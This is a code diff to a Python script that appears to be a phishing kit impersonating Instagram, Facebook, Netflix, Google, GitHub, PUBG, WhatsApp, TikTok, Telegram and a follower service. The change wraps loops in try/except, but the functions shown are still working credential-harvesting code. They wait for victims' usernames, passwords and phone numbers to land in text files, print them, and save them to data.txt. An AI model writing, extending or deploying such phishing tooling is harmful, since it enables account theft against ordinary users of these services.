@@ -233,46 +233,49 @@ def instagram():
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
     
 #write username====================================================================================================
-    while True:
-        size = os.stat("username_key.txt")
-        if size.st_size != 0:
-            with open("username_key.txt" , "r") as user:
-                sleep(10)
-                print(f"\r\n\n{Fore.GREEN}The username is : {Fore.LIGHTWHITE_EX}" , user.read())
+    try:
+        while True:
+            size = os.stat("username_key.txt")
+            if size.st_size != 0:
+                with open("username_key.txt" , "r") as user:
+                    sleep(10)
+                    print(f"\r\n\n{Fore.GREEN}The username is : {Fore.LIGHTWHITE_EX}" , user.read())
 
-                #clear username.txt file
-                username =open("username_key.txt")  
-                data = open("data.txt","a")
-                for x in username.readlines():
-                    data.write(f"\nThe Username is : {x}")
-                sleep(1.5)
-                open("username_key.txt" , "w").close()
-                
-                break
-#write password====================================================================================================
+                    #clear username.txt file
+                    username =open("username_key.txt")  
+                    data = open("data.txt","a")
+                    for x in username.readlines():
+                        data.write(f"\nThe Username is : {x}")
+                    sleep(1.5)
+                    open("username_key.txt" , "w").close()
+                    
+                    break
+    #write password====================================================================================================
 
-    while True:
-        size = os.stat("password_key.txt")
-        if size.st_size != 0:
-            with open("password_key.txt" , "r") as pas:
-                sleep(15)
-                print(f"\r{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
+        while True:
+            size = os.stat("password_key.txt")
+            if size.st_size != 0:
+                with open("password_key.txt" , "r") as pas:
+                    sleep(15)
+                    print(f"\r{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
 
-                #clear password.txt
-                pwd =open("password_key.txt")  
-                data = open("data.txt","a")
-                for x in pwd.readlines():
-                    data.write(f"\nThe Password is : {x}")
-                    data.write("\n")
-                data.close()
-                sleep(1.5)
-                open("password_key.txt" , "w").close()
-                
-                sleep(0.5)
-                print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Username and Password saved in data.txt" + Fore.RESET)
+                    #clear password.txt
+                    pwd =open("password_key.txt")  
+                    data = open("data.txt","a")
+                    for x in pwd.readlines():
+                        data.write(f"\nThe Password is : {x}")
+                        data.write("\n")
+                    data.close()
+                    sleep(1.5)
+                    open("password_key.txt" , "w").close()
+                    
+                    sleep(0.5)
+                    print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Username and Password saved in data.txt" + Fore.RESET)
 
-                break
-
+                    break
+    except KeyboardInterrupt:
+            exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
 #kill php proccess and exit====================================================================================================
 
     if os.name == "nt":
@@ -366,45 +369,49 @@ def facebook():
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
 
 #write username====================================================================================================
-    while True:
-        size = os.stat("username_key.txt")
-        if size.st_size != 0:
-            with open("username_key.txt" , "r") as user:
-                sleep(10)
-                print(f"\r\n\n{Fore.GREEN}The user name is : {Fore.LIGHTWHITE_EX}" , user.read())
+    try:
+        while True:
+            size = os.stat("username_key.txt")
+            if size.st_size != 0:
+                with open("username_key.txt" , "r") as user:
+                    sleep(10)
+                    print(f"\r\n\n{Fore.GREEN}The user name is : {Fore.LIGHTWHITE_EX}" , user.read())
 
-                #clear username.txt file
-                username =open('username_key.txt')  
-                data = open('data.txt','a')
-                for x in username.readlines():
-                    data.write(f"\nThe Username is : {x}")
-                sleep(1.5)
-                open("username_key.txt" , "w").close()
+                    #clear username.txt file
+                    username =open('username_key.txt')  
+                    data = open('data.txt','a')
+                    for x in username.readlines():
+                        data.write(f"\nThe Username is : {x}")
+                    sleep(1.5)
+                    open("username_key.txt" , "w").close()
 
-                break
-#write password====================================================================================================
+                    break
+    #write password====================================================================================================
 
-    while True:
-        size = os.stat("password_key.txt")
-        if size.st_size != 0:
-            with open("password_key.txt" , "r") as pas:
-                sleep(10)
-                print(f"\r{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
+        while True:
+            size = os.stat("password_key.txt")
+            if size.st_size != 0:
+                with open("password_key.txt" , "r") as pas:
+                    sleep(10)
+                    print(f"\r{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
 
-                #clear password.txt
-                pwd =open('password_key.txt')  
-                data = open('data.txt','a')
-                for x in pwd.readlines():
-                    data.write(f"\nThe Password is : {x}")
-                    data.write("\n")
-                data.close()
-                sleep(1.5)
-                open("password_key.txt" , "w").close()
+                    #clear password.txt
+                    pwd =open('password_key.txt')  
+                    data = open('data.txt','a')
+                    for x in pwd.readlines():
+                        data.write(f"\nThe Password is : {x}")
+                        data.write("\n")
+                    data.close()
+                    sleep(1.5)
+                    open("password_key.txt" , "w").close()
 
-                sleep(0.5)
-                print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Username and Password saved in data.txt" + Fore.RESET)
+                    sleep(0.5)
+                    print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Username and Password saved in data.txt" + Fore.RESET)
 
-                break
+                    break
+    except KeyboardInterrupt:
+            exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
 #kill php proccess and exit====================================================================================================
 
     if os.name == "nt":
@@ -499,45 +506,49 @@ def netflix():
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
 
 #write username====================================================================================================
-    while True:
-        size = os.stat("username_key.txt")
-        if size.st_size != 0:
-            with open("username_key.txt" , "r") as user:
-                sleep(10)
-                print(f"\r\n\n{Fore.GREEN}The user name is : {Fore.LIGHTWHITE_EX}" , user.read())
+    try:
+        while True:
+            size = os.stat("username_key.txt")
+            if size.st_size != 0:
+                with open("username_key.txt" , "r") as user:
+                    sleep(10)
+                    print(f"\r\n\n{Fore.GREEN}The user name is : {Fore.LIGHTWHITE_EX}" , user.read())
 
-                #clear username.txt file
-                username =open('username_key.txt')  
-                data = open('data.txt','a')
-                for x in username.readlines():
-                    data.write(f"\nThe Username is : {x}")
-                sleep(1.5)
-                open("username_key.txt" , "w").close()
+                    #clear username.txt file
+                    username =open('username_key.txt')  
+                    data = open('data.txt','a')
+                    for x in username.readlines():
+                        data.write(f"\nThe Username is : {x}")
+                    sleep(1.5)
+                    open("username_key.txt" , "w").close()
 
-                break
-#write password====================================================================================================
+                    break
+    #write password====================================================================================================
 
-    while True:
-        size = os.stat("password_key.txt")
-        if size.st_size != 0:
-            with open("password_key.txt" , "r") as pas:
-                sleep(9)
-                print(f"\r{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
+        while True:
+            size = os.stat("password_key.txt")
+            if size.st_size != 0:
+                with open("password_key.txt" , "r") as pas:
+                    sleep(9)
+                    print(f"\r{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
 
-                #clear password.txt
-                pwd =open('password_key.txt')  
-                data = open('data.txt','a')
-                for x in pwd.readlines():
-                    data.write(f"\nThe Password is : {x}")
-                    data.write("\n")
-                data.close()
-                sleep(1.5)
-                open("password_key.txt" , "w").close()
+                    #clear password.txt
+                    pwd =open('password_key.txt')  
+                    data = open('data.txt','a')
+                    for x in pwd.readlines():
+                        data.write(f"\nThe Password is : {x}")
+                        data.write("\n")
+                    data.close()
+                    sleep(1.5)
+                    open("password_key.txt" , "w").close()
 
-                sleep(0.5)
-                print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Username and Password saved in data.txt" + Fore.RESET)
+                    sleep(0.5)
+                    print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Username and Password saved in data.txt" + Fore.RESET)
 
-                break
+                    break
+    except KeyboardInterrupt:
+            exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
 #kill php proccess and exit====================================================================================================
 
     if os.name == "nt":
@@ -633,45 +644,49 @@ def Google():
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
 
 #write username====================================================================================================
-    while True:
-        size = os.stat("username_key.txt")
-        if size.st_size != 0:
-            with open("username_key.txt" , "r") as user:
-                sleep(10)
-                print(f"\r\n\n{Fore.GREEN}The User Name is : {Fore.LIGHTWHITE_EX}" , user.read())
+    try:
+        while True:
+            size = os.stat("username_key.txt")
+            if size.st_size != 0:
+                with open("username_key.txt" , "r") as user:
+                    sleep(10)
+                    print(f"\r\n\n{Fore.GREEN}The User Name is : {Fore.LIGHTWHITE_EX}" , user.read())
 
-                #clear username.txt file
-                username =open('username_key.txt')  
-                data = open('data.txt','a')
-                for x in username.readlines():
-                    data.write(f"\nThe Username is : {x}")
-                sleep(1.5)
-                open("username_key.txt" , "w").close()
+                    #clear username.txt file
+                    username =open('username_key.txt')  
+                    data = open('data.txt','a')
+                    for x in username.readlines():
+                        data.write(f"\nThe Username is : {x}")
+                    sleep(1.5)
+                    open("username_key.txt" , "w").close()
 
-                break
-#write password====================================================================================================
+                    break
+    #write password====================================================================================================
 
-    while True:
-        size = os.stat("password_key.txt")
-        if size.st_size != 0:
-            with open("password_key.txt" , "r") as pas:
-                sleep(9)
-                print(f"\r{Fore.GREEN}The Password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
+        while True:
+            size = os.stat("password_key.txt")
+            if size.st_size != 0:
+                with open("password_key.txt" , "r") as pas:
+                    sleep(9)
+                    print(f"\r{Fore.GREEN}The Password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
 
-                #clear password.txt
-                pwd =open('password_key.txt')  
-                data = open('data.txt','a')
-                for x in pwd.readlines():
-                    data.write(f"\nThe Password is : {x}")
-                    data.write("\n")
-                data.close()
-                sleep(1.5)
-                open("password_key.txt" , "w").close()
+                    #clear password.txt
+                    pwd =open('password_key.txt')  
+                    data = open('data.txt','a')
+                    for x in pwd.readlines():
+                        data.write(f"\nThe Password is : {x}")
+                        data.write("\n")
+                    data.close()
+                    sleep(1.5)
+                    open("password_key.txt" , "w").close()
 
-                sleep(0.5)
-                print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Username and Password saved in data.txt" + Fore.RESET)
+                    sleep(0.5)
+                    print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Username and Password saved in data.txt" + Fore.RESET)
 
-                break
+                    break
+    except KeyboardInterrupt:
+            exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
 #kill php proccess and exit====================================================================================================
 
     if os.name == "nt":
@@ -763,46 +778,49 @@ def Github():
         exit(f"""\n{Fore.YELLOW}│
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
 #write username====================================================================================================
-    while True:
-        size = os.stat("username_key.txt")
-        if size.st_size != 0:
-            with open("username_key.txt" , "r") as user:
-                sleep(10)
-                print(f"\r\n\n{Fore.GREEN}The username is : {Fore.LIGHTWHITE_EX}" , user.read())
+    try:
+        while True:
+            size = os.stat("username_key.txt")
+            if size.st_size != 0:
+                with open("username_key.txt" , "r") as user:
+                    sleep(10)
+                    print(f"\r\n\n{Fore.GREEN}The username is : {Fore.LIGHTWHITE_EX}" , user.read())
 
-                #clear username.txt file
-                username =open('username_key.txt')  
-                data = open('data.txt','a')
-                for x in username.readlines():
-                    data.write(f"\nThe Username is : {x}")
-                sleep(1.5)
-                open("username_key.txt" , "w").close()
+                    #clear username.txt file
+                    username =open('username_key.txt')  
+                    data = open('data.txt','a')
+                    for x in username.readlines():
+                        data.write(f"\nThe Username is : {x}")
+                    sleep(1.5)
+                    open("username_key.txt" , "w").close()
 
-                break
-#write password====================================================================================================
+                    break
+    #write password====================================================================================================
 
-    while True:
-        size = os.stat("password_key.txt")
-        if size.st_size != 0:
-            with open("password_key.txt" , "r") as pas:
-                sleep(10)
-                print(f"\r{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
+        while True:
+            size = os.stat("password_key.txt")
+            if size.st_size != 0:
+                with open("password_key.txt" , "r") as pas:
+                    sleep(10)
+                    print(f"\r{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
 
-                #clear password.txt
-                pwd =open('password_key.txt')  
-                data = open('data.txt','a')
-                for x in pwd.readlines():
-                    data.write(f"\nThe Password is : {x}")
-                    data.write("\n")
-                data.close()
-                sleep(1.5)
-                open("password_key.txt" , "w").close()
+                    #clear password.txt
+                    pwd =open('password_key.txt')  
+                    data = open('data.txt','a')
+                    for x in pwd.readlines():
+                        data.write(f"\nThe Password is : {x}")
+                        data.write("\n")
+                    data.close()
+                    sleep(1.5)
+                    open("password_key.txt" , "w").close()
 
-                sleep(0.5)
-                print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Username and Password saved in data.txt" + Fore.RESET)
+                    sleep(0.5)
+                    print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Username and Password saved in data.txt" + Fore.RESET)
 
-                break
-
+                    break
+    except KeyboardInterrupt:
+            exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
 #kill php proccess and exit====================================================================================================
 
     if os.name == "nt":
@@ -895,45 +913,49 @@ def Pubg():
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
     
 #write username====================================================================================================
-    while True:
-        size = os.stat("username_key.txt")
-        if size.st_size != 0:
-            with open("username_key.txt" , "r") as user:
-                sleep(10)
-                print(f"\r\n\n{Fore.GREEN}The username is : {Fore.LIGHTWHITE_EX}" , user.read())
+    try:
+        while True:
+            size = os.stat("username_key.txt")
+            if size.st_size != 0:
+                with open("username_key.txt" , "r") as user:
+                    sleep(10)
+                    print(f"\r\n\n{Fore.GREEN}The username is : {Fore.LIGHTWHITE_EX}" , user.read())
 
-                #clear username.txt file
-                username =open('username_key.txt')  
-                data = open('data.txt','a')
-                for x in username.readlines():
-                    data.write(f"\nThe Username is : {x}")
-                sleep(1.5)
-                open("username_key.txt" , "w").close()
+                    #clear username.txt file
+                    username =open('username_key.txt')  
+                    data = open('data.txt','a')
+                    for x in username.readlines():
+                        data.write(f"\nThe Username is : {x}")
+                    sleep(1.5)
+                    open("username_key.txt" , "w").close()
 
-                break
-#write password====================================================================================================
+                    break
+    #write password====================================================================================================
 
-    while True:
-        size = os.stat("password_key.txt")
-        if size.st_size != 0:
-            with open("password_key.txt" , "r") as pas:
-                sleep(10)
-                print(f"\r{Fore.GREEN}The Password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
+        while True:
+            size = os.stat("password_key.txt")
+            if size.st_size != 0:
+                with open("password_key.txt" , "r") as pas:
+                    sleep(10)
+                    print(f"\r{Fore.GREEN}The Password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
 
-                #clear password.txt
-                pwd =open('password_key.txt')  
-                data = open('data.txt','a')
-                for x in pwd.readlines():
-                    data.write(f"\nThe Password is : {x}")
-                    data.write("\n")
-                data.close()
-                sleep(1.5)
-                open("password_key.txt" , "w").close()
+                    #clear password.txt
+                    pwd =open('password_key.txt')  
+                    data = open('data.txt','a')
+                    for x in pwd.readlines():
+                        data.write(f"\nThe Password is : {x}")
+                        data.write("\n")
+                    data.close()
+                    sleep(1.5)
+                    open("password_key.txt" , "w").close()
 
-                sleep(0.5)
-                print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Username and Password saved in data.txt" + Fore.RESET)
+                    sleep(0.5)
+                    print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Username and Password saved in data.txt" + Fore.RESET)
 
-                break
+                    break
+    except KeyboardInterrupt:
+            exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
 #kill php proccess and exit====================================================================================================
 
     if os.name == "nt":
@@ -1029,46 +1051,49 @@ def follower():
 ╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
     
 #write username====================================================================================================
-    while True:
-        size = os.stat("username_key.txt")
-        if size.st_size != 0:
-            with open("username_key.txt" , "r") as user:
-                sleep(10)
-                print(f"\r\n\n{Fore.GREEN}The username is : {Fore.LIGHTWHITE_EX}" , user.read())
+    try:
+        while True:
+            size = os.stat("username_key.txt")
+            if size.st_size != 0:
+                with open("username_key.txt" , "r") as user:
+                    sleep(10)
+                    print(f"\r\n\n{Fore.GREEN}The username is : {Fore.LIGHTWHITE_EX}" , user.read())
 
-                #clear username.txt file
-                username =open("username_key.txt")  
-                data = open("data.txt","a")
-                for x in username.readlines():
-                    data.write(f"\nThe Username is : {x}")
-                sleep(1.5)
-                open("username_key.txt" , "w").close()
-                
-                break
-#write password====================================================================================================
+                    #clear username.txt file
+                    username =open("username_key.txt")  
+                    data = open("data.txt","a")
+                    for x in username.readlines():
+                        data.write(f"\nThe Username is : {x}")
+                    sleep(1.5)
+                    open("username_key.txt" , "w").close()
+                    
+                    break
+    #write password====================================================================================================
 
-    while True:
-        size = os.stat("password_key.txt")
-        if size.st_size != 0:
-            with open("password_key.txt" , "r") as pas:
-                sleep(15)
-                print(f"\r{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
+        while True:
+            size = os.stat("password_key.txt")
+            if size.st_size != 0:
+                with open("password_key.txt" , "r") as pas:
+                    sleep(15)
+                    print(f"\r{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
 
-                #clear password.txt
-                pwd =open("password_key.txt")  
-                data = open("data.txt","a")
-                for x in pwd.readlines():
-                    data.write(f"\nThe Password is : {x}")
-                    data.write("\n")
-                data.close()
-                sleep(1.5)
-                open("password_key.txt" , "w").close()
-                
-                sleep(0.5)
-                print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Username and Password saved in data.txt" + Fore.RESET)
+                    #clear password.txt
+                    pwd =open("password_key.txt")  
+                    data = open("data.txt","a")
+                    for x in pwd.readlines():
+                        data.write(f"\nThe Password is : {x}")
+                        data.write("\n")
+                    data.close()
+                    sleep(1.5)
+                    open("password_key.txt" , "w").close()
+                    
+                    sleep(0.5)
+                    print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Username and Password saved in data.txt" + Fore.RESET)
 
-                break
-
+                    break
+    except KeyboardInterrupt:
+            exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
 #kill php proccess and exit====================================================================================================
 
     if os.name == "nt":
@@ -1166,29 +1191,31 @@ def Whatsapp():
     
 
 #write Number====================================================================================================
+    try:
+        while True:
+            size = os.stat("Number.txt")
+            if size.st_size != 0:
+                with open("Number.txt" , "r") as pas:                                                                                                                                                
+                    sleep(15)
+                    print(f"\r{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
 
-    while True:
-        size = os.stat("Number.txt")
-        if size.st_size != 0:
-            with open("Number.txt" , "r") as pas:                                                                                                                                                
-                sleep(15)
-                print(f"\r{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
+                    #clear Number.txt
+                    pwd =open("Number.txt")  
+                    data = open("data.txt","a")
+                    for x in pwd.readlines():
+                        data.write(f"\nUser Number is : {x}")
+                        data.write("\n")
+                    data.close()
+                    sleep(1.5)
+                    open("Number.txt" , "w").close()
+                    
+                    sleep(0.5)
+                    print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Number saved in data.txt" + Fore.RESET)
 
-                #clear Number.txt
-                pwd =open("Number.txt")  
-                data = open("data.txt","a")
-                for x in pwd.readlines():
-                    data.write(f"\nUser Number is : {x}")
-                    data.write("\n")
-                data.close()
-                sleep(1.5)
-                open("Number.txt" , "w").close()
-                
-                sleep(0.5)
-                print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Number saved in data.txt" + Fore.RESET)
-
-                break
-
+                    break
+    except KeyboardInterrupt:
+            exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
 #kill php proccess and exit====================================================================================================
 
     if os.name == "nt":
@@ -1286,29 +1313,31 @@ def Tiktok():
     
 
 #write Number====================================================================================================
+    try:
+        while True:
+            size = os.stat("Number.txt")
+            if size.st_size != 0:
+                with open("Number.txt" , "r") as pas:
+                    sleep(15)
+                    print(f"\r{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
 
-    while True:
-        size = os.stat("Number.txt")
-        if size.st_size != 0:
-            with open("Number.txt" , "r") as pas:
-                sleep(15)
-                print(f"\r{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
+                    #clear Number.txt
+                    pwd =open("Number.txt")  
+                    data = open("data.txt","a")
+                    for x in pwd.readlines():
+                        data.write(f"\nUser Number is : {x}")
+                        data.write("\n")
+                    data.close()
+                    sleep(1.5)
+                    open("Number.txt" , "w").close()
+                    
+                    sleep(0.5)
+                    print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Number saved in data.txt" + Fore.RESET)
 
-                #clear Number.txt
-                pwd =open("Number.txt")  
-                data = open("data.txt","a")
-                for x in pwd.readlines():
-                    data.write(f"\nUser Number is : {x}")
-                    data.write("\n")
-                data.close()
-                sleep(1.5)
-                open("Number.txt" , "w").close()
-                
-                sleep(0.5)
-                print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Number saved in data.txt" + Fore.RESET)
-
-                break
-
+                    break
+    except KeyboardInterrupt:
+            exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
 #kill php proccess and exit====================================================================================================
 
     if os.name == "nt":
@@ -1406,29 +1435,31 @@ def Telegram():
     
 
 #write Number====================================================================================================
+    try:
+        while True:
+            size = os.stat("Number.txt")
+            if size.st_size != 0:
+                with open("Number.txt" , "r") as pas:                                                                                                                                                
+                    sleep(15)
+                    print(f"\r{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
 
-    while True:
-        size = os.stat("Number.txt")
-        if size.st_size != 0:
-            with open("Number.txt" , "r") as pas:                                                                                                                                                
-                sleep(15)
-                print(f"\r{Fore.GREEN}The password is : {Fore.LIGHTWHITE_EX}" , pas.read() + Fore.RESET)
+                    #clear Number.txt
+                    pwd =open("Number.txt")  
+                    data = open("data.txt","a")
+                    for x in pwd.readlines():
+                        data.write(f"\nUser Number is : {x}")
+                        data.write("\n")
+                    data.close()
+                    sleep(1.5)
+                    open("Number.txt" , "w").close()
+                    
+                    sleep(0.5)
+                    print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Number saved in data.txt" + Fore.RESET)
 
-                #clear Number.txt
-                pwd =open("Number.txt")  
-                data = open("data.txt","a")
-                for x in pwd.readlines():
-                    data.write(f"\nUser Number is : {x}")
-                    data.write("\n")
-                data.close()
-                sleep(1.5)
-                open("Number.txt" , "w").close()
-                
-                sleep(0.5)
-                print(f"\n\r{Fore.GREEN}[+]{Fore.LIGHTWHITE_EX} Number saved in data.txt" + Fore.RESET)
-
-                break
-
+                    break
+    except KeyboardInterrupt:
+            exit(f"""\n{Fore.YELLOW}│
+╰┈➤{Fore.RED}[-]{Fore.BLUE} User Exited :)""")
 #kill php proccess and exit====================================================================================================
 
     if os.name == "nt":
